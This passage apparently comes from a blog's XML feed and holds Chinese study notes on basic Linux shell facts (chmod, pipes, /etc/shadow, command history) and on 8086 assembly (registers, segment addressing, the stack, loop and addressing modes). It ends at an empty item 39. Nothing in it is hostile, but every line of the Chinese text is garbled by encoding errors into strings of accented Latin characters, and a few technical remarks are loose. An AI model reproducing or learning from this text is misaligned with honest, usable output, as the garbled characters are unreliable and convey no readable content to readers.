<h3 id="ä¸‰ã€ä¸€äº›å¸¸è¯†"><a href="#ä¸‰ã€ä¸€äº›å¸¸è¯†" class="headerlink" title="ä¸‰ã€ä¸€äº›å¸¸è¯†"></a>ä¸‰ã€ä¸€äº›å¸¸è¯†</h3><p>1ã€åœ¨Linuxä¸­ï¼Œshellä¸­æ‰§è¡Œå¯æ‰§è¡Œæ–‡ä»¶æ—¶è¦å†™æˆå¦‚**./mycat** çš„æ ¼å¼ï¼Œå› ä¸ºåœ¨Linuxç³»ç»Ÿé‡Œï¼Œç³»ç»Ÿåªä¼šæœç´¢ç¯å¢ƒå˜é‡pathä¸­å»å¯»æ‰¾ï¼ŒåŠ ä¸ª***./*** æ˜¯å‘Šè¯‰ç³»ç»Ÿå»å½“å‰ç›®å½•ä¸‹å»å¯»æ‰¾</p>
<p>2ã€chmod 754 æ–‡ä»¶åï¼Œç”¨æ¥ç»™æ–‡ä»¶æƒé™è¿›è¡Œåˆ’åˆ†ï¼Œå…¶ä¸­rä¸º4ï¼Œwä¸º2ï¼Œxä¸º1</p>
<p>3ã€ä¸€ä¸ªç‰¹æ®Šç¬¦å·ï¼šç®¡é“å‘½ä»¤ç¬¦ â€œ|â€ åŠŸèƒ½ä¸ºï¼šå°†åœ¨ç®¡é“å‘½ä»¤ç¬¦|å·¦è¾¹å‘½ä»¤çš„æ ‡å‡†è¾“å‡ºä½œä¸ºå³è¾¹å‘½ä»¤çš„æ ‡å‡†è¾“å…¥ </p>
<p>4ã€Linuxç³»ç»Ÿä¸­ç”¨æˆ·çš„ç”¨æˆ·åä»¥åŠå¯†ç ä¿å­˜åœ¨/etc/shadowä¸­</p>
<p>5ã€.bash_historyé‡Œé¢å­˜å‚¨ç€æŒ‡ä»¤æ‰§è¡Œçš„å†å²è®°å½•ï¼Œå¯¹åº”æƒé™æŸ¥çœ‹å¯¹åº”æƒé™æ‰§è¡Œçš„å‘½ä»¤ï¼›ç›´æ¥è¾“å…¥<code>history n </code>  ä¹Ÿå¯ä»¥æŸ¥çœ‹æœ€è¿‘æ‰§è¡Œçš„næ¡å‘½ä»¤è®°å½•ï¼Œ<code>history -c</code>æ¸…ç©ºå‘½ä»¤è®°å½•</p>
<p>6ã€grep çš„ä½œç”¨æ˜¯æŸ¥æ‰¾ç›¸å…³å­—ç¬¦â€‚</p>
]]></content>
  </entry>
  <entry>
    <title>å‹‡é—¯æ±‡ç¼–â€”â€”éšæ‰‹è®°</title>
    <url>/2020/10/17/2020-10-17-%E5%8B%87%E9%97%AF%E6%B1%87%E7%BC%96%E2%80%94%E2%80%94%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h5 id="å­¦ä¹ ä¹¦ç±ä¸ºã€Šæ±‡ç¼–è¯­è¨€ã€‹ï¼ˆç¬¬äºŒç‰ˆï¼‰"><a href="#å­¦ä¹ ä¹¦ç±ä¸ºã€Šæ±‡ç¼–è¯­è¨€ã€‹ï¼ˆç¬¬äºŒç‰ˆï¼‰" class="headerlink" title="å­¦ä¹ ä¹¦ç±ä¸ºã€Šæ±‡ç¼–è¯­è¨€ã€‹ï¼ˆç¬¬äºŒç‰ˆï¼‰"></a>å­¦ä¹ ä¹¦ç±ä¸ºã€Šæ±‡ç¼–è¯­è¨€ã€‹ï¼ˆç¬¬äºŒç‰ˆï¼‰</h5><p>æ±‡ç¼–è¯­è¨€æ˜¯ä¸€ç§ä¸ºäº†æ–¹ä¾¿ç¨‹åºå‘˜è®°å¿†ï¼ŒæŸ¥çœ‹ï¼Œçº é”™è€Œè®¾è®¡çš„ä¸€ç§è¯­è¨€ï¼Œè®¡ç®—æœºæ˜¯æ— æ³•ç›´æ¥æ‰§è¡Œçš„ï¼Œå¿…é¡»ç”±ç¼–è¯‘å™¨å°†æ±‡ç¼–è¯­è¨€è½¬åŒ–æˆç›¸åº”çš„æœºå™¨æŒ‡ä»¤ï¼ˆäºŒè¿›åˆ¶ï¼‰æ‰èƒ½è¢«è®¡ç®—æœºæ‰€æ‰§è¡Œã€‚</p>
<p>1ã€CPUæƒ³è¯»å†™ä¸€ä¸ªå­˜å‚¨å™¨èŠ¯ç‰‡çš„æŸä¸ªå•å…ƒé‡Œé¢çš„æ•°æ®æ—¶ï¼Œè¦æœ‰ä¸‰æ­¥éª¤ï¼Œç¬¬ä¸€ï¼Œå…ˆè¦çŸ¥é“è¯¥å­˜å‚¨å•å…ƒçš„å…·ä½“ä½ç½®ï¼ˆé€šè¿‡åœ°å€çº¿ï¼‰ï¼›ç¬¬äºŒï¼Œå‘æ§åˆ¶å­˜å‚¨å™¨èŠ¯ç‰‡ä¼ è¾¾è¯»å†™æŒ‡ä»¤ï¼ˆé€šè¿‡æ§åˆ¶çº¿ï¼‰ï¼›ç¬¬ä¸‰ï¼Œå°†æ•°æ®è¯»å‡ºæˆ–è€…å†™å…¥è¯¥å­˜å‚¨å•å…ƒï¼ˆé€šè¿‡æ•°æ®çº¿ï¼‰</p>
<p>2ã€å½“ä¸€ä¸ªCPUåœ°å€æ€»çº¿å®½åº¦ä¸ºnï¼ˆCPUæœ‰næ ¹åœ°å€çº¿ï¼Œæ¯æ ¹å¯¼çº¿å¯ä»¥ä¼ é€çš„ç¨³å®šçŠ¶æ€åªæœ‰ä¸¤ç§ï¼Œé«˜ç”µå¹³ä¸ä½ç”µå¹³ï¼Œå¯ä»¥ç”¨0æˆ–1ä»£æ›¿è®°å¿†ï¼‰æœ€å¤šå¯ä»¥å¯»æ‰¾åˆ°2çš„næ¬¡æ–¹ä¸ªçš„å­˜å‚¨å•å…ƒï¼Œæ•°æ®çº¿åŒç†ï¼Œå°†ä¼ è¾“å‡º2çš„næ¬¡æ–¹ä¸ªæ•°æ®ã€‚è€Œæ§åˆ¶çº¿åˆ™æ˜¯æœ‰å¤šå°‘æ ¹å°±ä»£è¡¨æœ‰CPUå¯¹å¤–éƒ¨å™¨ä»¶æœ‰å¤šå°‘ç§æ§åˆ¶ã€‚</p>
<p>3ã€ä¸€ä¸ªå­˜å‚¨å•å…ƒï¼ˆä¸€ä¸ªå­—èŠ‚ï¼‰å¯ä»¥å­˜å‚¨å…«ä¸ªä½ï¼ˆbitï¼‰ï¼Œå­˜å‚¨å•å…ƒä»0å¼€å§‹ç¼–å·</p>
<p>4ã€å­˜å‚¨å™¨èŠ¯ç‰‡ä»è¯»å†™å±æ€§ä¸Šåˆ†ä¸ºä¸¤ç±»ï¼šéšæœºå­˜å‚¨å™¨ï¼ˆRAMï¼‰å’Œåªè¯»å­˜å‚¨å™¨ï¼ˆROMï¼‰ã€‚RAMå¯è¯»å¯å†™ï¼Œä½†å¿…é¡»å¸¦ç”µå­˜å‚¨ï¼Œå…³æœºåå­˜å‚¨å†…å®¹ä¸¢å¤±ï¼›ROMåªèƒ½è¯»å–ï¼Œä¸èƒ½å†™å…¥ï¼Œå…³æœºåå…¶ä¸­çš„å†…å®¹ä¸ä¸¢å¤±ã€‚</p>
<p>5ã€BIOSï¼ˆBasic Input/Output System,åŸºæœ¬å†™å…¥/å†™å‡ºç³»ç»Ÿï¼‰å¯é€šè¿‡å®ƒåˆ©ç”¨ç¡¬ä»¶è®¾å¤‡è¿›è¡Œæœ€åŸºæœ¬çš„è¾“å…¥è¾“å‡º</p>
<p>6ã€å†…å­˜åœ°å€ç©ºé—´ï¼šï¼ˆä¸ªäººç†è§£ï¼‰CPUæ‰€èƒ½æ‰¾å¯»çš„åœ°å€èŒƒå›´å†…çš„æ‰€æœ‰çš„å­˜å‚¨å™¨é›†åˆèµ·æ¥çš„æ•´ä¸ªç©ºé—´å«åšå†…å­˜åœ°å€ç©ºé—´ï¼Œè€Œä¸åŒçš„å­˜å‚¨å™¨æ„æˆçš„æ˜¯æ›´å°çš„åœ°å€ç©ºé—´</p>
<p>7ã€ä¸€ä¸ªCPUé€šå¸¸ç”±è¿ç®—å™¨ï¼ˆå¤„ç†ä¿¡æ¯ï¼‰ã€æ§åˆ¶å™¨ï¼ˆæ§åˆ¶å„ç§å™¨ä»¶è¿›è¡Œå·¥ä½œï¼‰ã€å¯„å­˜å™¨ï¼ˆå­˜å‚¨ä¿¡æ¯ï¼‰ç­‰å™¨ä»¶æ„æˆï¼Œå™¨ä»¶é—´é€šè¿‡CPUå†…éƒ¨çš„æ€»çº¿ç›¸è¿ã€‚</p>
<p>8ã€æ±‡ç¼–ç¨‹åºå‘˜é€šè¿‡æ”¹å˜å¯„å­˜å™¨ä¸­çš„å†…å®¹æ¥è°ƒåŠ¨CPUè¿›è¡Œå„é¡¹å·¥ä½œ</p>
<p>9ã€åœ¨å†™æ±‡ç¼–æŒ‡ä»¤æˆ–è€…å¯„å­˜å™¨åç§°æ—¶ä¸åŒºåˆ†å¤§å°å†™</p>
<p>10ã€æ‰€æœ‰å†…å­˜å•å…ƒæ„æˆçš„å­˜å‚¨ç©ºé—´æ˜¯ä¸€ä¸ªä¸€ç»´çš„çº¿æ€§ç©ºé—´ï¼Œæ¯ä¸€ä¸ªå†…å­˜å•å…ƒåœ¨è¿™ä¸ªç©ºé—´ä¸­éƒ½æœ‰å”¯ä¸€çš„åœ°å€ï¼Œè€Œè¿™ä¸ªåœ°å€è¢«ç§°ä¸ºç‰©ç†åœ°å€ã€‚</p>
<p>11ã€8086CPUä¸º16ä½ç»“æ„ï¼Œè€Œåœ°å€æ€»çº¿è¾¾åˆ°äº†20ä½ï¼Œæ­¤æ—¶é‡‡ç”¨å°†ä¸¤ä¸ª16ä½åœ°å€åˆæˆä¸ºä¸€ä¸ª20ä½åœ°å€ï¼Œé€šè¿‡åœ°å€åŠ æ³•å™¨ï¼šç‰©ç†åœ°å€=åŸºç¡€åœ°å€ï¼ˆæ®µåœ°å€*16ï¼‰+åç§»åœ°å€</p>
<p>12ã€ä¸€ä¸ªxè¿›åˆ¶çš„æ•°æ®å·¦ç§»1ä½ï¼Œç›¸å½“äºä¹˜ä»¥x</p>
<p>13ã€CS:IPæŒ‡å‘çš„å†…å­˜å•å…ƒä¸­çš„å†…å®¹å°†ä¼šè¢«CPUå½“åšæŒ‡ä»¤æ‰§è¡Œï¼ˆCSä¸­ä¿å­˜æŒ‡ä»¤çš„æ®µåœ°å€ï¼ŒIPä¿å­˜åç§»åœ°å€ï¼‰ï¼Œç”¨CS,IPåˆæˆçš„ç‰©ç†åœ°å€ï¼Œå»å†…å­˜ä¸­è¯»å–æŒ‡ä»¤ç ç¨‹åºå‘˜é€šè¿‡æ”¹å˜å¯„å­˜å™¨çš„å†…å®¹å®ç°å¯¹CPUçš„æ§åˆ¶ï¼Œæ‰€ä»¥æ”¹å˜CS,IPå¯ä»¥æ§åˆ¶CPUæ‰§è¡Œç›®æ ‡æŒ‡ä»¤</p>
<p>14ã€å¯ç”¨<strong>jmp æ®µåœ°å€:åç§»åœ°å€</strong>ä¿®æ”¹CS:IPçš„æŒ‡ä»¤ï¼›jmpåè·Ÿç€çš„åœ°å€æˆä¸ºCSä¸IPä¸­çš„å†…å®¹ï¼›å¦‚æœå†™æˆ<strong>jmp æŸå¯„å­˜å™¨</strong>å°±æ˜¯ç”¨è¯¥å¯„å­˜å™¨ä¸­çš„å€¼ä¿®æ”¹IPä¸­çš„å†…å®¹ï¼›å¸¸ç”¨çš„movæŒ‡ä»¤å¹¶ä¸èƒ½ä¿®æ”¹CSã€IPçš„å€¼</p>
<p>15ã€å°†ä¸€æ®µå†…å­˜ç”¨äºå­˜æ”¾ä»£ç ï¼Œåˆ™å°±è¢«ç§°ä¸ºä»£ç æ®µï¼Œä»£ç æ®µå¯ä»¥ä½¿å¾—åªéœ€æŒ‡å‘ä»£ç æ®µä¸­çš„ç¬¬ä¸€ä¸ªæŒ‡ä»¤çš„ç‰©ç†ä½ç½®ï¼Œå³å¯æ¥ç€æ‰§è¡Œä»£ç æ®µå…¶ä½™çš„ä»£ç æŒ‡ä»¤</p>
<p>16ã€å®é™…ä¸Šåœ¨å†…å­˜ä¸­æ•°æ®å’ŒæŒ‡ä»¤å¹¶æœªæœ‰åŒºåˆ«ï¼Œéƒ½æ˜¯äºŒè¿›åˆ¶æ•°ï¼ï¼ï¼</p>
<p>17ã€å¦‚æœå°†AX,BX,CX,DXç­‰å¦‚AXæ‹†åˆ†æˆä¸¤ä¸ªå…«ä½çš„å¯„å­˜å™¨ï¼Œåˆ™AHæ˜¯é«˜å…«ä½ï¼ŒALæ˜¯ä½å…«ä½</p>
<p>18ã€å­—(word)ï¼šç”±ä¸¤ä¸ªå­—èŠ‚ç»„æˆï¼Œè¿™ä¸¤ä¸ªå­—èŠ‚åˆ†ä¸ºé«˜ä½å­—èŠ‚å’Œä½ä½å­—èŠ‚ã€‚è¿˜æœ‰dwordæ˜¯ç”±åŒå­—ï¼ˆå››ä¸ªå­—èŠ‚ï¼‰ç»„æˆï¼Œqwordç”±å››å­—ç»„æˆ</p>
<p>19ã€ä¼ è¾“æ•°æ®æˆ–è¿ç®—æ—¶ï¼Œéœ€è¦æ³¨æ„å¯„å­˜å™¨æ‰€èƒ½å­˜å‚¨çš„ä½æ•°å¤§å°ï¼Œæ˜¯å¦ä¼šæ¯”æ‰€ä¼ è¾“æ•°æ®å°ï¼Œå¦‚æœæ¯”ä¼ è¾“æ•°æ®å°ï¼Œå°†åªèƒ½ä¿å­˜è¯¥å¯„å­˜å™¨æ‰€èƒ½ä¿å­˜çš„æœ€å¤šä½æ•°ï¼Œé«˜ä½æ•°æ®å°†ä¸èƒ½è¢«ä¿å­˜è¿›å¯„å­˜å™¨ï¼Œå¹¶ä¸”éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ­£å¸¸çš„æŒ‡ä»¤æ˜¯ä¸èƒ½åœ¨å­˜å‚¨å¤§å°ä¸åŒçš„å¯„å­˜å™¨é—´è¿›è¡Œæ“ä½œï¼Œä¾‹å¦‚ï¼šmov bx,alæ˜¯é”™è¯¯çš„æŒ‡ä»¤</p>
<p>å¦ï¼šä½†æ˜¯åœ¨ç°åœ¨çš„x64æ¶æ„ä¸‹ï¼Œæœ‰movçš„å˜å¼movzxç¡®æ˜¯å¯ä»¥è¿›è¡ŒæŠŠå­˜å‚¨åœ¨ä½æ•°å°çš„å¯„å­˜å™¨ä¸­çš„å€¼æ‹·è´åˆ°ä½æ•°å¤§çš„å¯„å­˜å™¨ä¸­ï¼šmovzx bx,al</p>
<p>20ã€[address]è¡¨ç¤ºä¸€ä¸ªå†…å­˜å•å…ƒï¼Œaddressè¡¨ç¤ºå†…å­˜å•å…ƒçš„åç§»åœ°å€ï¼Œæ®µåœ°å€åˆ™å­˜åœ¨ç›¸åº”çš„æ®µå¯„å­˜å™¨ä¸­ã€‚ä¾‹å¦‚æ•°æ®æ®µçš„æ®µåœ°å€å­˜å‚¨åœ¨å¯„å­˜å™¨dsä¸­</p>
<p>å¦ï¼š</p>
<p>ï¼ˆ1ï¼‰åªæœ‰åœ¨debugä¸­æ‰èƒ½ç›´æ¥å†™æˆ[address]ï¼Œå¦‚æœåœ¨æ±‡ç¼–æºç¨‹åºç¼–å†™ï¼Œå‰é¢è¦åŠ ä¸Šæ®µå¯„å­˜å™¨ï¼Œ å¦‚ds:[address]ï¼ˆä½†æ˜¯è¿™åªæ˜¯åœ¨addressä¸ºå¸¸æ•°æ˜¯é€‚ç”¨ï¼Œå¦‚æœç”¨å¯„å­˜å™¨è¿›è¡Œè¡¨ç¤ºæ—¶ï¼Œç³»ç»Ÿé»˜è®¤æ®µåœ°å€åœ¨dsä¸­ï¼Œå¦‚æœæƒ³ä½¿ç”¨å…¶ä»–æ®µå¯„å­˜å™¨åˆ™éœ€è¦æ˜¾å¼çš„è¯´æ˜ï¼‰</p>
<p>ï¼ˆ2ï¼‰addresså¤„è¿˜å¯ä»¥å¡«å†™é€šç”¨å¯„å­˜å™¨ï¼Œè¡¨ç¤ºåç§»åœ°å€æ˜¯å­˜å‚¨åœ¨è¯¥å¯„å­˜å™¨ä¸­çš„ã€‚æ¯”å¦‚[bx]è¯´æ˜bxä¸­å­˜å‚¨çš„å†…å®¹ä½œä¸ºåç§»åœ°å€</p>
<p>21ã€ä¸èƒ½ç”¨movæŒ‡ä»¤ç›´æ¥æŠŠæ•°æ®ä¼ å…¥æ®µå¯„å­˜å™¨ï¼Œè¦é€šè¿‡ä½¿ç”¨é€šç”¨å¯„å­˜å™¨è¿›è¡Œä¸€æ¬¡ä¸­è½¬æ‰è¡Œï¼›æˆ–è€…ä¹Ÿå¯ä»¥æŠŠå†…å­˜å•å…ƒçš„å†…å®¹ä¼ å…¥æ®µå¯„å­˜å™¨ä¸­ã€‚æ®µå¯„å­˜å™¨çš„å†…å®¹ä¼ å…¥å…¶ä»–çš„åœ°æ–¹å‡å¯</p>
<p>å¦ï¼šsubï¼Œaddç­‰æŒ‡ä»¤ä¸èƒ½å¯¹æ®µå¯„å­˜å™¨è¿›è¡Œè¿ç®—ï¼Œä¼šæŠ¥é”™</p>
<p>22ã€movä¸€æ¬¡èƒ½ä¼ è¾“çš„æ•°æ®çš„ä½æ•°ç”±å¯„å­˜å™¨çš„å¤§å°å†³å®šï¼Œå¦‚alï¼Œåˆ™ä¼ è¾“ä¸€ä¸ªå†…å­˜å•å…ƒï¼ˆä¸€ä¸ªå­—èŠ‚ï¼‰çš„å†…å®¹ï¼›å¦‚axåˆ™ä¼ è¾“ä¸¤ä¸ªå†…å­˜å•å…ƒï¼ˆä¸€ä¸ªå­—ï¼‰çš„å†…å®¹</p>
<p>23ã€æ ˆï¼šæ˜¯ä¸€ç§å…·æœ‰ç‰¹æ®Šè®¿é—®æ–¹å¼çš„å­˜å‚¨ç©ºé—´ã€‚æ“ä½œè§„åˆ™ï¼šæœ€åè¿›æ ˆçš„æ•°æ®ï¼Œæœ€å…ˆå‡ºå»ã€‚å¹¶ä¸”æ ˆé¡¶æ˜¯ä»é«˜åœ°å€å‘ä½åœ°å€å¢é•¿ã€‚</p>
<p>pushï¼šå…¥æ ˆã€‚ä¾‹å¦‚ï¼špush axè¡¨ç¤ºæŠŠå¯„å­˜å™¨axä¸­çš„æ•°æ®é€å…¥æ ˆä¸­</p>
<p>popï¼šå‡ºæ ˆã€‚ä¾‹å¦‚ï¼špop axè¡¨ç¤ºä»æ ˆé¡¶å–å‡ºæ•°æ®é€å…¥å¯„å­˜å™¨ax    </p>
<p>åœ¨8086CPUä¸­æ®µå¯„å­˜å™¨SSå’Œå¯„å­˜å™¨SPç”¨æ¥å­˜æ”¾æ ˆé¡¶çš„åœ°å€ï¼Œæ®µåœ°å€æ”¾åœ¨SSä¸­ï¼Œåç§»åœ°å€æ”¾åœ¨SPä¸­ã€‚ä»»æ„æ—¶åˆ»SS:SPéƒ½æŒ‡å‘æ ˆé¡¶å…ƒç´ ã€‚å½“æ ˆç©ºæ—¶ï¼ŒæŒ‡å‘æ ˆä¸­æœ€é«˜åœ°å€çš„ä¸‹ä¸€ä¸ªåœ°å€ï¼Œä¾‹å¦‚æ ˆæœ€é«˜åœ°å€ä¸º1000FHï¼Œé‚£ä¹ˆSS:SPæŒ‡å‘10010H</p>
<p>8086CPUçš„å‡ºå…¥æ ˆéƒ½æ˜¯ä»¥å­—ä¸ºå•ä½è¿›è¡Œçš„ï¼ˆæ‰€ä»¥æ¯æ¬¡SPè¿›è¡ŒæŒ‡å‘æ ˆé¡¶ï¼Œæ•°æ®å…¥æ ˆåˆ™å‡2ï¼›æ•°æ®å‡ºæ ˆåˆ™åŠ 2ï¼‰ä½†æ˜¯æ ˆä¸­æ•°æ®ä¾æ—§æ˜¯ä¸€ä¸ªå†…å­˜å•å…ƒå­˜å‚¨ä¸€ä¸ªå­—èŠ‚çš„å†…å®¹</p>
<p>8086CPUåªæœ‰ä½¿ç”¨SS:SPæŒ‡å‘æ ˆé¡¶çš„ä½ç½®ï¼Œå¹¶æœªä½¿ç”¨å…¶ä»–å¯„å­˜å™¨è¿›è¡Œæ£€éªŒæ ˆç©ºé—´æ˜¯å¦è¾¾åˆ°ä¸Šé™è€Œé€ æˆæ ˆè¶Šç•Œï¼ˆæ ˆæº¢å‡ºï¼‰è¦†ç›–åˆ«çš„å†…å­˜å•å…ƒ</p>
<p>pushä¸popæŒ‡ä»¤æ“ä½œå¯¹è±¡ä¸ä»…é™äºå¯„å­˜å™¨ï¼Œä¹Ÿå¯ä»¥ç”¨äºæ“ä½œæ®µå¯„å­˜å™¨ã€å†…å­˜å•å…ƒã€‚</p>
<p>24ã€å†…å­˜ç©ºé—´ä¸­æœ¬æ¥æ‰€æœ‰çš„å­˜å‚¨å•å…ƒéƒ½æ˜¯ä¸€è‡´çš„ï¼Œæ‰€è°“çš„å„ç§åˆ†æ®µçš„æ¦‚å¿µï¼Œæ˜¯å› ä¸ºç¨‹åºå‘˜å°†ä¹‹è¿›è¡Œåˆ’åˆ†ï¼Œè€Œè‹¥æ˜¯CPUæœ¬èº«æ˜¯æ— æ³•åˆ†è¾¨æˆ‘ä»¬æ‰€è°“çš„æ®µã€‚åªèƒ½é€šè¿‡ç›¸åº”çš„å¯„å­˜å™¨æ¥å‘Šè¯‰CPUï¼ŒæŸäº›å¯„å­˜å™¨æŒ‡å‘çš„å†…å®¹è¦åšç›¸åº”çš„å¤„ç†ï¼Œæ‰èƒ½æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„æ®µçš„æ¦‚å¿µåˆ’åˆ†</p>
<p>25ã€åœ¨Debugä¸­Tå‘½ä»¤åœ¨æ‰§è¡Œä¿®æ”¹æ®µå¯„å­˜å™¨SSçš„æŒ‡ä»¤æ—¶ï¼Œå¹¶ä¸ä¼šåœæ­¢ï¼Œè€Œæ˜¯æŠŠä¸‹ä¸€æ¡æŒ‡ä»¤ä¹Ÿæ‰§è¡Œäº†</p>
<p>26ã€é“¾æ¥ï¼š</p>
<p>ï¼ˆ1ï¼‰å½“æºç¨‹åºå¾ˆå¤§æ—¶ï¼Œå°†ä¹‹åˆ†ä¸ºå¤šä¸ªæºç¨‹åºæ–‡ä»¶è¿›è¡Œç¼–è¯‘ï¼Œæ¯ä¸ªæºç¨‹åºç¼–è¯‘å®Œæˆä¸ºç›®æ ‡æ–‡ä»¶åï¼Œå†ç”¨é“¾æ¥ç¨‹åºå°†ä»–ä»¬è¿åœ¨ä¸€èµ·ï¼Œç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶</p>
<p>ï¼ˆ2ï¼‰å¦‚æœç¨‹åºè°ƒç”¨äº†æŸä¸ªåº“æ–‡ä»¶ä¸­çš„å­ç¨‹åºï¼Œéœ€è¦å°†åº“æ–‡ä»¶å’Œç›®æ ‡æ–‡ä»¶é“¾æ¥åœ¨ä¸€èµ·ï¼Œç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶</p>
<p>ï¼ˆ3ï¼‰æºç¨‹åºç¼–è¯‘åï¼Œå¾—åˆ°äº†å­˜æœ‰æœºå™¨ç çš„ç›®æ ‡æ–‡ä»¶ï¼Œä½†æ˜¯ç›®æ ‡æ–‡ä»¶ä¸­çš„æœ‰äº›å†…å®¹è¿˜ä¸èƒ½ç›´æ¥ç”¨æ¥ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼Œè€Œé“¾æ¥ç¨‹åºå¯ä»¥å¤„ç†è¿™äº›å†…å®¹ï¼Œå°†ä¹‹å˜ä¸ºå¯æ‰§è¡Œçš„ï¼Œæ‰èƒ½ä½¿ç›®æ ‡æ–‡ä»¶å˜ä¸ºå¯æ‰§è¡Œæ–‡ä»¶</p>
<p>27ã€DOSç³»ç»Ÿä¸­.exeæ–‡ä»¶çš„åŠ è½½æ—¶ï¼Œåœ¨æŸæ®µè¶³å¤Ÿé•¿çš„å†…å­˜åŒºä¼šå…ˆåˆ›å»ºä¸€ä¸ªç§°ä¸ºç¨‹åºæ®µå‰ç¼€ï¼ˆPSPï¼‰çš„æ•°æ®åŒºï¼ŒDOSåˆ©ç”¨PSPæ¥å’Œè¢«åŠ è½½ç¨‹åºè¿›è¡Œé€šä¿¡ï¼ŒPSPé•¿åº¦ä¸º256å­—èŠ‚ï¼ˆ0~255ï¼‰ã€‚åœ¨å…¶ä¹‹åçš„æ‰æ˜¯ç¨‹åº   ï¼ˆäº†è§£å³å¯ï¼‰</p>
<p>28ã€incæŒ‡ä»¤æ˜¯åŠ ä¸€çš„æ„æ€ï¼Œå¦‚mov bx,1   inc bx  é‚£ä¹ˆbx==2</p>
<p>29ã€æ±‡ç¼–ä¸­ä¸€ä¸ªæ ‡å·ï¼ˆä¸ºæŸä¸ªå­—æ¯ï¼‰è¡¨ç¤ºä¸€ä¸ªåœ°å€</p>
<p>30ã€loopæŒ‡ä»¤</p>
<ul>
<li><p>loop æ ‡å·ï¼šå¾ªç¯æ‰§è¡Œæ ‡å·æŒ‡å‘åœ°å€å†…çš„å†…å®¹ï¼ˆä¸€èˆ¬ä¸ºæŒ‡ä»¤ï¼‰</p>
</li>
<li><p>æ ‡å·æ ‡è¯†çš„åœ°å€è¦åœ¨loopæŒ‡ä»¤å‰é¢</p>
</li>
<li><p>ä¸€èˆ¬åœ¨cxä¸­ä¿å­˜ç€loopå¾ªç¯æ¬¡æ•°ï¼Œæ‰§è¡Œå¾ªç¯å‰ï¼Œè¦å…ˆæŠŠå­˜å‚¨åœ¨cxä¸­å¾ªç¯æ¬¡æ•°å‡1ï¼Œä¸ä¸º0æ—¶å†æ‰§è¡ŒloopæŒ‡ä»¤è¿›è¡Œå¾ªç¯ï¼›ç›´åˆ°cxå€¼ä¸º0æ—¶åœæ­¢å¾ªç¯ï¼Œæ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤</p>
</li>
</ul>
<p>31ã€åœ¨æ±‡ç¼–æºç¨‹åºä¸­ä¸èƒ½ä»¥å­—æ¯ä½œä¸ºæ•°æ®çš„å¼€å¤´ï¼Œè‹¥æ˜¯æ•°æ®çš„ç¬¬ä¸€ä½æ˜¯å­—æ¯ï¼Œé‚£ä¹ˆè¦åœ¨å‰é¢åŠ ä¸ª0æ‰è¡Œ</p>
<p>32ã€æ®µå‰ç¼€ï¼šåœ¨åç§»åœ°å€å‰é¢æ˜¾å¼çš„ç”¨â€œds:ï¼Œcs:ï¼Œss:ï¼Œes:â€æŒ‡æ˜å†…å­˜å•å…ƒçš„æ®µåœ°å€</p>
<p>33ã€DOSæ–¹å¼ä¸‹ï¼ŒDOSå’Œå…¶ä»–åˆæ³•ç¨‹åºä¸€èˆ¬éƒ½ä¸ä¼šä½¿ç”¨0:200~0:2ffçš„256ä¸ªå­—èŠ‚çš„ç©ºé—´</p>
<p>34ã€è¡¨æ˜ä¸€ä¸ªå†…å­˜å•å…ƒå¯ä»¥ç”¨å¦‚[bx+200]è¿™æ ·çš„å½¢å¼ï¼Œè¡¨ç¤ºåç§»åœ°å€ä¸ºbxä¸­çš„æ•°å€¼åŠ ä¸Š200</p>
<p>ä¹Ÿå¯ä»¥å†™ä¸º200[bx] ï¼ˆè¿™ä¸Cè¯­è¨€ä¸­çš„æ•°ç»„å½¢å¼å¾ˆåƒï¼Œå‡è®¾æŠŠ200çœ‹ä½œèµ·å§‹åœ°å€ï¼Œbxçœ‹ä½œå¾ªç¯çš„iï¼‰æˆ–è€…[bx].200</p>
<p>35ã€åœ¨8086CPUå’Œx86ä¸‹siå’Œdiçš„åŠŸèƒ½ä¸bxç›¸è¿‘ï¼Œä½†æ˜¯siå’Œdiä¸èƒ½è¢«æ‹†åˆ†æˆä¸¤ä¸ª8ä½çš„å¯„å­˜å™¨</p>
<p>36ã€siæˆ–diå¯ä»¥ä¸å¦‚bxè¿™æ ·ä½¿ç”¨[bx+si]æˆ–è€…[bx] [si]ï¼Œä¸¤è€…ä½œç”¨ä¸€è‡´ä¸ºï¼šåç§»åœ°å€ç­‰äºsiä¸­çš„å€¼åŠ ä¸Šbxä¸­çš„å€¼ã€‚</p>
<p>è¿˜æœ‰è¿™æ ·çš„å½¢å¼ï¼š[bx+si+data] (dataæ˜¯ä¸€ä¸ªå…·ä½“çš„æ•°å€¼) å‡è®¾dataä¸º200ï¼›</p>
<p>å³ä¸º[bx+si+200] æˆ–æ˜¯200 [bx] [si] ï¼Œ[bx].200[si] ï¼Œ[bx] [si].200</p>
<p>37ã€ä¸€èˆ¬æ¥è¯´ï¼Œåœ¨éœ€è¦æš‚å­˜æ•°æ®çš„æ—¶å€™ï¼Œæˆ‘ä»¬éƒ½ä½¿ç”¨æ ˆæ¥ä¿å­˜æ•°æ®ã€‚å› ä¸ºå¯„å­˜å™¨çš„æ•°é‡å°‘ã€‚</p>
<p>38ã€åœ¨8086CPUä¸­åªæœ‰bxï¼Œbpï¼Œsiï¼Œdiå¯ä»¥ä½¿ç”¨å¦‚[bx]çš„å½¢å¼æ¥è¿›è¡Œå†…å­˜å•å…ƒçš„å¯»å€ï¼Œä½†æ˜¯ä»¥bxå’Œbpä¸ºä¸»ã€‚è¿™ä¸¤ä¸ªå¯„å­˜å™¨ä¸å¯ä»¥åŒæ—¶å‡ºç°åœ¨[â€¦]é‡Œé¢ï¼Œå› ä¸ºåœ¨æŒ‡ä»¤ä¸­å¦‚æœæ²¡æœ‰æ˜¾æ€§çš„ç»™å‡ºæ®µåœ°å€ï¼Œé‚£ä¹ˆbxä¸dsç›¸å…³è”ï¼Œè€Œbpä¸ssç›¸å…³è”ã€‚</p>
<p>39ã€</p>
<hr>
